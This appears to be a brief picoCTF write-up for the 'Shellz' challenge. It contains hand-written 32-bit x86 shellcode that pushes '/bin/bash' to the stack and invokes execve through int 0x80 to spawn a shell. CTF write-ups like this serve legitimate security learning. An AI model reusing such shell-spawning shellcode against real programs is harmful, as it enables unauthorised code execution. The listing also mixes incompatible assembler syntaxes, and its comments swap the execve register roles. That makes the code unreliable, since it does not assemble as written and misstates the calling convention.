# Shellz - 55 Points
You no longer have an easy thing to call, but you have more space. Program: [shellz!](https://webshell2017.picoctf.com/static/4218d89147526c9f5adcf25ff3688482/shellz) [Source](https://webshell2017.picoctf.com/static/4218d89147526c9f5adcf25ff3688482/shellz.c).

## Write-Up
Hmm.... Interesting how this one was worth *less* points than `Shells`. Probably because you could literally copy-paste shellcode from online and no one could blame you. I actually wrote my own (organic, homemade) shellcode. Here it is:
```assembly
#Prepares stack. Don't know why I even did that...
mov esp, ebp
sub 8, esp

#Pushes string '/bin/bash' to stack
push 0x68
push 0x7361622f
push 0x6e69622f

#Let's create the array for arguments here (only one is needed).
mov 0x0, dword [ ebp - 8 ]
mov esp, dword [ ebp - 4 ]

mov 0xb, eax # 0xb or 11 is syscall op code for execve.
mov esp, ebx # Pointer to our arguments array.
lea dword [ ebp - 8 ], ecx # This is the name of our program to call.
xor edx, edx #shortcut for setting environments pointer to NULL
int 0x80  # Interrupt to call kernel
```
Again, I used defuse to assemble my code and run.
